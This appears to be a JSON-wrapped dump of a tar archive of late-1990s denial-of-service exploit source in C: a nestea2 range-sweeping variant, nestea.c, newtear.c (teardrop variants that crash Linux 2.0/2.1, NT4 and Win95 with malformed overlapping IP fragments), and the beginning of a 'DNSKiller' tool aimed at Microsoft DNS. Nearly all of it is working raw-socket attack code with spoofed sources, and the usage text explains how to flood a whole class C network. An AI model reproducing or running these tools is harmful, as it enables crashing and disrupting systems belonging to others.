            "    fprintf(stderr, \"",
            "[1;34mDeath ",
            "[0;34mon flaxen wings (",
            "[1;34myet again",
            "[0;34m)",
            "[0m:\\n\");",
            "    addr.s_addr = src_ip;",
            "    fprintf(stderr, \"",
            "[1;34mFrom",
            "[0m: ",
            "[0;34m%15s.%d",
            "[0m\\n\", inet_ntoa(addr), src_prt);",
            "    addr.s_addr = dst_ip;",
            "    fprintf(stderr, \"  ",
            "[1;34mTo",
            "[0m: ",
            "[0;34m%15s - %s.%d",
            "[0m\\n\", inet_ntoa(addr), ",
            "    \t\t\t\t\t    dst_ip2, dst_prt);",
            "    fprintf(stderr, \" ",
            "[1;34mAmt",
            "[0m: ",
            "[0;34m%5d",
            "[0m\\n\", count);",
            "    if (bequiet) fprintf(stderr, \"",
            "[0;34m[",
            "[1;34mquiet mode",
            "[0;34m] ",
            "[0;34mEach'",
            "[1;34m.",
            "[0;34m' represents a nuked ip.  ",
            "[0;34m[",
            "[0m\");",
            "    for (j=startip.p4; j <= endip.p4; j++)",
            "    {",
            "      sprintf(hit_ip,\"%d.%d.%d.%d\",startip.p1,startip.p2,startip.p3,j);",
            "      ",
            "      if (!(bequiet)) fprintf(stderr, \"",
            "[0;34m%s ",
            "[1;34m[ ",
            "[0m\", hit_ip);",
            "                   ",
            "      if (!(dst_ip = name_resolve(hit_ip)))",
            "    {",
            "          fprintf(stderr, \"",
            "[0;34mWhat the ",
            "[1;34mhell ",
            "[0;34mkind of IP address is that?",
            "[0m\\n\");",
            "          exit(1);",
            "    }",
            "                                        ",
            "    for (i = 0; i < count; i++)",
            "    {",
            "        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "        if (!(bequiet)) fprintf(stderr, \"",
            "[0;34md",
            "[1;34m00",
            "[0;34mm ",
            "[0m\");          ",
            "    }",
            "    if (bequiet) fprintf(stderr, \"",
            "[1;34m.",
            "[0m\");",
            "    else fprintf(stderr, \"",
            "[0;34m]",
            "[0m\\n\");",
            "    }",
            "    if (bequiet) fprintf(stderr, \"",
            "[0;34m]",
            "[0m\\n\");",
            "    return (0);",
            "void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "                u_short dst_prt)",
            "int i;",
            "    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */",
            "    u_char byte;                            /* a byte */",
            "    struct sockaddr_in sin;                 /* socket protocol structure */",
            "    sin.sin_family      = AF_INET;",
            "    sin.sin_port        = src_prt;",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + 10);   /* UDP total length */",
            "    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = FIX(6);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + MAGIC2);   /* UDP total length */",
            "    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);",
            "    byte = 0x4F;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0 | FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 44;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */",
            "\tfor(i=0;i<PADDING;i++)",
            "\t\tp_ptr[i++]=random()%255;",
            "    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    free(packet);",
            "u_long name_resolve(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "        if (!(host_ent = gethostbyname(host_name))) return (0);",
            "        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);",
            "    }",
            "    return (addr.s_addr);",
            "void usage(u_char *name)",
            "    fprintf(stderr,",
            "[1;34mnestea2 ",
            "[0;34msource startIP endIP ",
            "[1;34m[",
            "[0;34m-s src port",
            "[1;34m] [",
            "[0;34m-t dest port",
            "[1;34m] [",
            "[0;34m-n quantity",
            "[1;34m] [",
            "[0;34m-q",
            "[1;34m]",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34msource   ",
            "[0m: ",
            "[1;34mThis is the source IP to nestea from, make it a spoof",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mstartIP  ",
            "[0m: ",
            "[1;34mFrom which IP should we start from? ",
            "[1;34m(",
            "[0;34meg 153.35.85.1",
            "[1;34m)",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mendIP    ",
            "[0m: ",
            "[1;34mFrom which IP should we end with?   ",
            "[1;34m(",
            "[0;34meg 153.35.95.255",
            "[1;34m)",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34msrc port ",
            "[0m: ",
            "[1;34mThis is the source port to spoof from ",
            "[1;34m(",
            "[0;34mOPTIONAL",
            "[1;34m)",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mdest port",
            "[0m: ",
            "[1;34mThis is the destination port to nestea to ",
            "[1;34m(",
            "[0;34mOPTIONAL",
            "[1;34m)",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mquantity ",
            "[0m: ",
            "[1;34mThis is how many times to nestea the victim ",
            "[1;34m(",
            "[0;34mperfered is 1000",
            "[1;34m)",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34m-q       ",
            "[0m: ",
            "[1;34mThis is quiet mode so you don't see the ",
            "[0;34md",
            "[1;34m00",
            "[0;34mm",
            "[1;34m's",
            "[0m\\n\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mExample  ",
            "[0m: ",
            "[1;34mnestea2 127.0.0.1 153.35.85.1 153.35.85.255 -n 1000",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mThe above was to hit a whole Class C of 153.35.85 with the return \\naddress from 127.0.0.1 doing it 1000 times",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mExample2 ",
            "[0m: ",
            "[1;34mnestea2 153.35.85.32 153.35.85.32 153.85.35.32 -n 1000",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[0;34mThe above was to hit 153.35.85.32 with the source 153.35.85.32 \\ndoing it 1000 times",
            "[0m\\n\");",
            "    fprintf(stderr, \"",
            "[1;34mI perfer example2, probably because it is the lazy man's way out",
            "[0m\\n\\n\");",
            "    fprintf(stderr, \"                             ",
            "[1;5;34mNOT TO BE DISTRIBUTED!",
            "[0m\\n\");",
            "     exit(0);",
            "datapool/src/nestea.c",
            "0100644",
            "0000000",
            "0000000",
            "00000020465",
            "07100655553",
            "013607",
            "ustar  ",
            "root",
            "root",
            "/* 01. nestea.c - exploits the \"off by one ip header\" bug in Linux */",
            " * nestea.c by humble of rhino9 4/16/98",
            " * This exploits the \"off by one ip header\" bug in the linux ip frag code.",
            " * Crashes linux 2.0.* and 2.1.*  and some windows boxes",
            " * this code is a total rip of teardrop - it's messy",
            " * hi sygma",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "// bsd usage is currently broken because of socket options on the third sendto",
            "#ifdef STRANGE_BSD_BYTE_ORDERING_THING",
            "                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */",
            "#define FIX(n)  (n)",
            "#else                   /* OpenBSD 2.1, all Linux */",
            "#define FIX(n)  htons(n)",
            "#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */",
            "#define IP_MF   0x2000  /* More IP fragment en route */",
            "#define IPH     0x14    /* IP header size */",
            "#define UDPH    0x8     /* UDP header size */",
            "#define MAGIC2  108",
            "#define PADDING 256    /* datagram frame padding for first packet */",
            "#define COUNT   500    /* we are overwriting a small number of bytes we ",
            "\t\t\tshouldnt have access to in the kernel. ",
            "\t\t\tto be safe, we should hit them till they die :>  */",
            "void usage(u_char *);",
            "u_long name_resolve(u_char *);",
            "u_short in_cksum(u_short *, int);",
            "void send_frags(int, u_long, u_long, u_short, u_short);",
            "int main(int argc, char **argv)",
            "    int one = 1, count = 0, i, rip_sock;",
            "    u_long  src_ip = 0, dst_ip = 0;",
            "    u_short src_prt = 0, dst_prt = 0;",
            "    struct in_addr addr;",
            "    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "        perror(\"raw socket\");",
            "        exit(1);",
            "    }",
            "    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))",
            "        < 0)",
            "    {",
            "        perror(\"IP_HDRINCL\");",
            "        exit(1);",
            "    }",
            "    if (argc < 3) usage(argv[0]);",
            "    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))",
            "    {",
            "        fprintf(stderr, \"What the hell kind of IP address is that?\\n\");",
            "        exit(1);",
            "    }",
            "    while ((i = getopt(argc, argv, \"s:t:n:\")) != EOF)",
            "    {",
            "        switch (i)",
            "        {",
            "            case 's':               /* source port (should be emphemeral) */",
            "                src_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 't':               /* dest port (DNS, anyone?) */",
            "                dst_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 'n':               /* number to send */",
            "                count   = atoi(optarg);",
            "                break;",
            "            default :",
            "                usage(argv[0]);",
            "                break;              /* NOTREACHED */",
            "        }",
            "    }",
            "    srandom((unsigned)(time((time_t)0)));",
            "    if (!src_prt) src_prt = (random() % 0xffff);",
            "    if (!dst_prt) dst_prt = (random() % 0xffff);",
            "    if (!count)   count   = COUNT;",
            "    fprintf(stderr, \"Nestea by humble\\nCode ripped from teardrop by route / daemon9\\n\");",
            "    fprintf(stderr, \"Death on flaxen wings (yet again):\\n\");",
            "    addr.s_addr = src_ip;",
            "    fprintf(stderr, \"From: %15s.%5d\\n\", inet_ntoa(addr), src_prt);",
            "    addr.s_addr = dst_ip;",
            "    fprintf(stderr, \"  To: %15s.%5d\\n\", inet_ntoa(addr), dst_prt);",
            "    fprintf(stderr, \" Amt: %5d\\n\", count);",
            "    fprintf(stderr, \"[ \");",
            "    for (i = 0; i < count; i++)",
            "    {",
            "        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "        fprintf(stderr, \"b00m \");",
            "    }",
            "    fprintf(stderr, \"]\\n\");",
            "    return (0);",
            "void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "                u_short dst_prt)",
            "int i;",
            "    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */",
            "    u_char byte;                            /* a byte */",
            "    struct sockaddr_in sin;                 /* socket protocol structure */",
            "    sin.sin_family      = AF_INET;",
            "    sin.sin_port        = src_prt;",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    packet = (u_char *)malloc(IPH + UDPH + PADDING+40);",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + 10);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + 10);   /* UDP total length */",
            "    if (sendto(sock, packet, IPH + UDPH + 10, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING);",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + MAGIC2);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = FIX(6);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + MAGIC2);   /* UDP total length */",
            "    if (sendto(sock, packet, IPH + UDPH + MAGIC2, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING+40);",
            "    byte = 0x4F;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING+40);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0 | FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 44;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + PADDING);   /* UDP total length */",
            "\tfor(i=0;i<PADDING;i++)",
            "\t\tp_ptr[i++]=random()%255;",
            "    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    free(packet);",
            "u_long name_resolve(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "        if (!(host_ent = gethostbyname(host_name))) return (0);",
            "        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);",
            "    }",
            "    return (addr.s_addr);",
            "void usage(u_char *name)",
            "    fprintf(stderr,",
            "            \"%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\\n\",",
            "            name);",
            "    exit(0);",
            "datapool/src/newtear.c",
            "0100644",
            "0000000",
            "0000000",
            "00000017124",
            "07100655570",
            "013772",
            "ustar  ",
            "root",
            "root",
            "/*  Newtear.c",
            " *  Seemingly, a new teardrop type exploit. Affects NT4, and Win95.",
            " *  Discovered 01/08/1998",
            " *  Updated notes:",
            " *     This is a new version of teardrop.  It affects NT 4 and Win95 machines with all",
            " *     current patches and hotfixes.  Causes a bluescreen in both operating systems.",
            " *     Linux appears unaffected, other *NIXes untested.  Differences are:",
            " *     Smaller padding data size (20 bytes instead of 28 in previous teardrop)",
            " *     Faked out UDP total length.  (Increased reported UDP length to twice what it really is)",
            " *  Copyright (c) 1997 route|daemon9  <route@infonexus.com> 11.3.97",
            " *  Linux/NT/95 Overlap frag bug exploit",
            " *  Exploits the overlapping IP fragment bug present in all Linux kernels and",
            " *  NT 4.0 / Windows 95 (others?)",
            " *  Based off of:   flip.c by klepto",
            " *  Compiles on:    Linux, *BSD*",
            " *  gcc -O2 teardrop.c -o teardrop",
            " *      OR",
            " *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <unistd.h>",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <sys/types.h>",
            "#include <sys/time.h>",
            "#include <sys/socket.h>",
            "#ifdef STRANGE_BSD_BYTE_ORDERING_THING",
            "                        /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0 */",
            "#define FIX(n)  (n)",
            "#else                   /* OpenBSD 2.1, all Linux */",
            "#define FIX(n)  htons(n)",
            "#endif  /* STRANGE_BSD_BYTE_ORDERING_THING */",
            "#define IP_MF   0x2000  /* More IP fragment en route */",
            "#define IPH     0x14    /* IP header size */",
            "#define UDPH    0x8     /* UDP header size */",
            "#define PADDING 0x14    /* datagram frame padding for first packet */ /* JD Change pad size to 20 decimal. */",
            "#define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 */",
            "#define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can",
            "                         * withstand maybe 5 or 10 sometimes...  Experiment.",
            "                         */",
            "void usage(u_char *);",
            "u_long name_resolve(u_char *);",
            "u_short in_cksum(u_short *, int);",
            "void send_frags(int, u_long, u_long, u_short, u_short);",
            "int main(int argc, char **argv)",
            "    int one = 1, count = 0, i, rip_sock;",
            "    u_long  src_ip = 0, dst_ip = 0;",
            "    u_short src_prt = 0, dst_prt = 0;",
            "    struct in_addr addr;",
            "    fprintf(stderr, \"teardrop   route|daemon9\\n\\n\");",
            "    if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)",
            "    {",
            "        perror(\"raw socket\");",
            "        exit(1);",
            "    }",
            "    if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one))",
            "        < 0)",
            "    {",
            "        perror(\"IP_HDRINCL\");",
            "        exit(1);",
            "    }",
            "    if (argc < 3) usage(argv[0]);",
            "    if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2])))",
            "    {",
            "        fprintf(stderr, \"What the hell kind of IP address is that?\\n\");",
            "        exit(1);",
            "    }",
            "    while ((i = getopt(argc, argv, \"s:t:n:\")) != EOF)",
            "    {",
            "        switch (i)",
            "        {",
            "            case 's':               /* source port (should be emphemeral) */",
            "                src_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 't':               /* dest port (DNS, anyone?) */",
            "                dst_prt = (u_short)atoi(optarg);",
            "                break;",
            "            case 'n':               /* number to send */",
            "                count   = atoi(optarg);",
            "                break;",
            "            default :",
            "                usage(argv[0]);",
            "                break;              /* NOTREACHED */",
            "        }",
            "    }",
            "    srandom((unsigned)(time((time_t)0)));",
            "    if (!src_prt) src_prt = (random() % 0xffff);",
            "    if (!dst_prt) dst_prt = (random() % 0xffff);",
            "    if (!count)   count   = COUNT;",
            "    fprintf(stderr, \"Death on flaxen wings:\\n\");",
            "    addr.s_addr = src_ip;",
            "    fprintf(stderr, \"From: %15s.%5d\\n\", inet_ntoa(addr), src_prt);",
            "    addr.s_addr = dst_ip;",
            "    fprintf(stderr, \"  To: %15s.%5d\\n\", inet_ntoa(addr), dst_prt);",
            "    fprintf(stderr, \" Amt: %5d\\n\", count);",
            "    fprintf(stderr, \"[ \");",
            "    for (i = 0; i < count; i++)",
            "    {",
            "        send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);",
            "        fprintf(stderr, \"b00m \");",
            "    }",
            "    fprintf(stderr, \"]\\n\");",
            "    return (0);",
            " *  Send two IP fragments with pathological offsets.  We use an implementation",
            " *  independent way of assembling network packets that does not rely on any of",
            " *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).",
            "void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,",
            "                u_short dst_prt)",
            "    u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */",
            "    u_char byte;                            /* a byte */",
            "    struct sockaddr_in sin;                 /* socket protocol structure */",
            "    sin.sin_family      = AF_INET;",
            "    sin.sin_port        = src_prt;",
            "    sin.sin_addr.s_addr = dst_ip;",
            "    /*",
            "     * Grab some memory for our packet, align p_ptr to point at the beginning",
            "     * of our packet, and then fill it with zeros.",
            "     */",
            "    packet = (u_char *)malloc(IPH + UDPH + PADDING);",
            "    p_ptr  = packet;",
            "    bzero((u_char *)p_ptr, IPH + UDPH + PADDING); // Set it all to zero",
            "    byte = 0x45;                        /* IP version and header length */",
            "    memcpy(p_ptr, &byte, sizeof(u_char));",
            "    p_ptr += 2;                         /* IP TOS (skipped) */",
            "    *((u_short *)p_ptr) = FIX(IPH + UDPH + PADDING);    /* total length */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(242);   /* IP id */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) |= FIX(IP_MF);  /* IP frag flags and offset */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = 0x40;         /* IP TTL */",
            "    byte = IPPROTO_UDP;",
            "    memcpy(p_ptr + 1, &byte, sizeof(u_char));",
            "    p_ptr += 4;                         /* IP checksum filled in by kernel */",
            "    *((u_long *)p_ptr) = src_ip;        /* IP source address */",
            "    p_ptr += 4;",
            "    *((u_long *)p_ptr) = dst_ip;        /* IP destination address */",
            "    p_ptr += 4;",
            "    *((u_short *)p_ptr) = htons(src_prt);       /* UDP source port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(dst_prt);       /* UDP destination port */",
            "    p_ptr += 2;",
            "    *((u_short *)p_ptr) = htons(8 + PADDING*2);   /* UDP total length */ /* Increases UDP total length to 48 bytes",
            "                                                     Which is too big! */",
            "    if (sendto(sock, packet, IPH + UDPH + PADDING, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    /*  We set the fragment offset to be inside of the previous packet's",
            "     *  payload (it overlaps inside the previous packet) but do not include",
            "     *  enough payload to cover complete the datagram.  Just the header will",
            "     *  do, but to crash NT/95 machines, a bit larger of packet seems to work",
            "     *  better.",
            "     */",
            "    p_ptr = &packet[2];         /* IP total length is 2 bytes into the header */",
            "    *((u_short *)p_ptr) = FIX(IPH + MAGIC + 1);",
            "    p_ptr += 4;                 /* IP offset is 6 bytes into the header */",
            "    *((u_short *)p_ptr) = FIX(MAGIC);",
            "    if (sendto(sock, packet, IPH + MAGIC + 1, 0, (struct sockaddr *)&sin,",
            "                sizeof(struct sockaddr)) == -1)",
            "    {",
            "        perror(\"\\nsendto\");",
            "        free(packet);",
            "        exit(1);",
            "    }",
            "    free(packet);",
            "u_long name_resolve(u_char *host_name)",
            "    struct in_addr addr;",
            "    struct hostent *host_ent;",
            "    if ((addr.s_addr = inet_addr(host_name)) == -1)",
            "    {",
            "        if (!(host_ent = gethostbyname(host_name))) return (0);",
            "        bcopy(host_ent->h_addr, (char *)&addr.s_addr, host_ent->h_length);",
            "    }",
            "    return (addr.s_addr);",
            "void usage(u_char *name)",
            "    fprintf(stderr,",
            "            \"%s src_ip dst_ip [ -s src_prt ] [ -t dst_prt ] [ -n how_many ]\\n\",",
            "            name);",
            "    exit(0);",
            "/* EOF */",
            "datapool/src/nt-dns.c",
            "0100644",
            "0000000",
            "0000000",
            "00000013255",
            "07077663300",
            "013534",
            "ustar  ",
            "root",
            "root",
            "/****************************************************************************",
            "** DNSKiller",
            "** Demonstrates a bug in Microsoft DNS server.",
            "** Version 0.9-970210 -  I don't know if this works.",
            "** (c) 1997 - Rikhardur Egilsson - rikardur@skyrr.is",
            "*****************************************************************************/",
            "#include <string.h>",
            "#include <netdb.h>",
            "#include <stdio.h>",
            "#include <unistd.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/udp.h>",
            "#include <arpa/inet.h>",
            "#include <arpa/nameser.h>",
            "void Usage(char *str) {",
            "        printf(\"Usage: %s [-s <source_host>] -d <dest_host>\\n\", str);",
            "        printf(\"      <source_host> is an optional spoofed 'from' address.\\n\");",
            "        printf(\"      <dest_host> is the NT DNS server.\\n\");",
            "        exit(-1);",
            "/****************************************************************************",
            "** Use: host = GetHost(name)",
            "** For: 'name' is 0, or points to a ASCIIZ string.",
            "** After: 'host' is the, network byte order, IP number of 'host', if found,",
            "**      or 0 if not found.",
            "**      If 'name' was 0 'host' represents this host.",
            "*****************************************************************************/",
            "unsigned long int GetHost(char *name) {",
            "        char buf[100];",
